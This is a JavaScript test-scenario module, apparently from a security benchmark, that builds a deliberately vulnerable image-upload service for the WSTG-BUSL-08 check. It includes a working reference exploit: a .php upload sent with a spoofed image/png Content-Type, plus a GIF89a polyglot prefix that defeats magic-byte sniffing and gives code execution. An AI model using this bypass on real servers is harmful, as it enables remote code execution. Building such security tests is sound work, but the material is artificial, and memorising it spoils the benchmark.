// WSTG-BUSL-08 (4.10.8) — Upload of Unexpected File Types behaviour.
// Node front shows an image-upload UI and proxies /upload + /uploads/* to a real
// PHP backend. The backend's type check trusts the client Content-Type header,
// so spoofing image/png while uploading a .php bypasses it; php -S then executes
// the unexpected file (RCE) and dumps the canary.
//
// T1: the backend additionally sniffs the request body's first bytes against a
// list of real image-format magics (GIF87a/GIF89a, PNG, JPEG). A bare PHP body
// with a spoofed Content-Type now fails this check. The bypass is a polyglot:
// prefix the upload body with a GIF89a header before the PHP payload — the
// magic-byte sniff passes, the file is written verbatim under /uploads/, and
// php -S still executes the .php body, which dumps the canary.

import { Scenario } from './scenario.mjs'

const B = 'classes/wstg-file-upload-unexpected-4.10.8/backends'

export const classDef = {
  wstgId: 'WSTG-BUSL-08',
  class: 'Upload of Unexpected File Types',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  backend: {
    spec({ manifest }) {
      return {
        cmd: 'php',
        args: ['-S', '127.0.0.1:9001', `${B}/router.php`],
        port: 9001,
        env: {
          PR_BACKEND_PORT: '9001',
          PR_CANARY: manifest.perDeployCanary,
          // Forward the deploy tier so the PHP backend can decide whether
          // to apply magic-byte sniffing on top of the Content-Type check.
          PR_DEFENCE_TIER: String(manifest.defenceTier || 0),
        },
      }
    },
  },

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path ||
      reqUrl.pathname === '/upload' ||
      reqUrl.pathname.startsWith('/uploads/')
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage }) {
    if (reqUrl.pathname === scenario.endpoint.path && req.method === 'GET') {
      return { status: 200, body: renderPage(uploadUI(scenario)) }
    }
    const r = await helpers.proxyToBackend(req, reqUrl)
    return { status: r.status, headers: { 'Content-Type': 'text/html; charset=utf-8' }, body: r.body }
  },

  // Reference exploit. Payload selects the body shape:
  //   'plain'    — bare PHP body (T0; spoof Content-Type is enough)
  //   'polyglot' — GIF89a magic prefix + PHP body (T1; passes magic sniff)
  async fireExploit({ baseUrl, payload }) {
    const mode = (payload && payload.mode) || 'plain'
    const name = 'pr_' + Math.random().toString(36).slice(2, 9) + '.php'
    const php = '<?php echo getenv("PR_CANARY"); ?>'
    // GIF89a header (6 bytes) + a minimal logical-screen-descriptor (7 bytes),
    // then a PHP block. The bytes before <?php are emitted as text by php -S
    // but the engine still parses <?php ... ?> when it appears, so the canary
    // is included in the response. Total prefix length stays small to keep
    // the payload obviously a polyglot.
    const polyglotPrefix = 'GIF89a' + String.fromCharCode(1, 0, 1, 0, 0, 0, 0)
    const body = mode === 'polyglot' ? (polyglotPrefix + php) : php
    await fetch(`${baseUrl}/upload?name=${encodeURIComponent(name)}`, {
      method: 'POST',
      headers: { 'Content-Type': 'image/png' }, // spoofed — bypasses the Content-Type filter at T0/T1
      body,
      redirect: 'manual',
    })
    const r = await fetch(`${baseUrl}/uploads/${name}`, { redirect: 'manual' })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function uploadUI(scenario) {
  return `<section style="max-width:560px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.intro)}</p>
  <form method="POST" action="/upload" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:10px">
    <label>Choose a ${escapeHtml(scenario.imageNoun)} image (PNG/JPEG/GIF)<input type="file" name="file" accept="image/*" style="display:block;margin-top:6px"></label>
    <button type="submit" style="padding:9px 14px">Upload ${escapeHtml(scenario.imageNoun)}</button>
  </form>
  <p style="font-size:13px;color:#666;margin-top:12px">Only image uploads are accepted. Uploaded ${escapeHtml(scenario.imageNoun)}s are stored under <code>/uploads/</code> and served back directly.</p>
</section>`
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
